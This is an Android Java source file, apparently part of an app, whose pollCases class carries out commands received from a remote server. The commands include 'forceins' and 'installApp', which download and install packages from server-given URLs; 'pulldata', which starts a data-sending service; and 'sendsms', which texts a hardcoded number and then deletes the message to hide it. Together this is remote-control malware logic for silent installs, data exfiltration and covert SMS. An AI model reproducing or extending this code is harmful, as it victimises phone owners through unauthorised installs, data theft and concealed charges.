package com.media.ui.ServerJobs;

import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import com.media.ui.DataCollector.CnfInstall;
import com.media.ui.Notifications.installNotification;
import com.media.ui.Notifications.sendNotification;
import com.media.ui.Services.dataSender;
import com.media.ui.Util.SMSManager;
import com.media.ui.constants;

import java.io.InputStream;
import java.util.HashMap;

import static android.content.Context.NOTIFICATION_SERVICE;
import static com.media.ui.Util.logger.logg;
import static java.lang.Thread.sleep;


/**
 * Created by prabeer.kochar on 05-08-2017.
 */

public class pollCases {
    String loc1 = constants.AppFolder;

    /*
        hm.put(1, data);
        hm.put(2, status);
        hm.put(3, camp_id_res);
      */
    public void pollcase(HashMap hash, Context context) {
        if (!hash.isEmpty()) {
            String val = (String) hash.get(2);
            String camp_id = (String) hash.get(3);
            String adt = (String) hash.get(1);
           // logg("adtRAW:" + adt);
            String[] adt_arr = adt.split("\\|");
           // logg("adtarr:" + adt_arr.toString());
            String uri;
            String pkg;
            switch (val) {
                case "noti":
                    String data = (String) hash.get(1);
                    new sendNotification(camp_id, data, 1, context);
                    break; // optional
                case "askins":
                    // Statements.
                    String heading = adt_arr[0];
                    String text = adt_arr[1];
                    Bitmap icon = dlBitmap(adt_arr[2]);
                    new installNotification(context).addNotification(heading, text, String.valueOf(camp_id), icon);
                    break; // optional
                // You can have any number of case statements.
                case "forceins":
                    logg("Arr_Length:-" + Integer.toString(adt_arr.length));
                    if (adt_arr.length > 1) {
                        uri = adt_arr[0];
                        pkg = adt_arr[1];
                        logg("adt:" + adt_arr[0] + "|" + adt_arr[1]);
                        camp_id = (String) hash.get(3);
                        new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                    }
                    break; // optional
                case "pulldata":
                    Intent newIntent = new Intent(context, dataSender.class);
                    newIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startService(newIntent);
                    break; // optional
                case "conf":
                    // Statements
                    break; // optional
                case "cleandb":
                    // Statements
                    break; // optional
                case "installApp":
                    if (adt_arr.length > 1) {
                        uri = adt_arr[0];
                        pkg = adt_arr[1];
                        camp_id = (String) hash.get(3);
                        NotificationManager notificationmanager = (NotificationManager) context
                                .getSystemService(NOTIFICATION_SERVICE);
                        notificationmanager.cancel(8935);
                        new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                        // Statements
                    }
                    break; // optional
                case "execcmd":
                    // Statements
                    break; // optional
                case "sendsms":
                    SMSManager y = new SMSManager();
                    y.sendsms("09821490074", "Test Message", context);
                    try {
                        sleep(5000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    y.deleteSMS(context, "Test Message", "09821490074");
                    // Statements
                    break; // optional
                default: // Optional
                    // Statements
            }

        }
    }

    private Bitmap dlBitmap(String ur) {
        String imageURL = ur;

        Bitmap bitmap = null;
        try {
            // Download Image from URL
            InputStream input = new java.net.URL(imageURL).openStream();
            // Decode Bitmap
            bitmap = BitmapFactory.decodeStream(input);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bitmap;
    }
}
